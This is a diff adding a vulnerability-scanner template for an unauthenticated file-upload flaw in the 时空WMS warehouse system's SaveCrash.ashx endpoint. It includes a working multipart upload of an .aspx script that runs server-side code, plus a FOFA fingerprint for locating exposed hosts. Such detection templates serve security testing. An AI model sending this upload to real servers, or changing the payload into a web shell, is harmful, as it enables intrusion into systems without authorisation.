@@ -1,0 +1,42 @@
+id: shikong-wms-savecrash-fileupload
+
+info:
+  name: 时空WMS-仓储精细化管理系统 SaveCrash.ashx 文件上传
+  author: zan8in
+  severity: critical
+  verified: true
+  description: |-
+    时空WMS-仓储精细化管理系统 SaveCrash.ashx 接口存在文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+    fofa: body="SKControlKLForJson.ashx"
+  reference:
+    - https://mp.weixin.qq.com/s/G3GAAuun5KkVxFVqRrQr0Q
+  tags: shikong,fileupload
+  created: 2024/12/31
+
+set:
+  rboundary: randomLowercase(8)
+  randbody: randomLowercase(32)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /crash/SaveCrash.ashx
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: |
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="file"; filename="{{username}}.aspx"
+        Content-Type: text/plain
+
+        <%@Page Language="C#"%><%Response.Write("{{randbody}}");System.IO.File.Delete(Request.PhysicalPath);%>
+        ------WebKitFormBoundary{{rboundary}}--
+    expression: response.status == 200 && response.body.bcontains(b'"Msg_code":"0"') && response.body.bcontains(b'"Msg_info":/crash/log/')
+    output:
+      search: '"\"Msg_info\":(?P<filename>.+).aspx".bsubmatch(response.body)'
+      filename: search["filename"]
+  r1:
+    request:
+      method: GET
+      path: /{{filename}}.aspx
+    expression: response.status == 200 && response.body.bcontains(bytes(randbody))
+expression: r0() && r1()
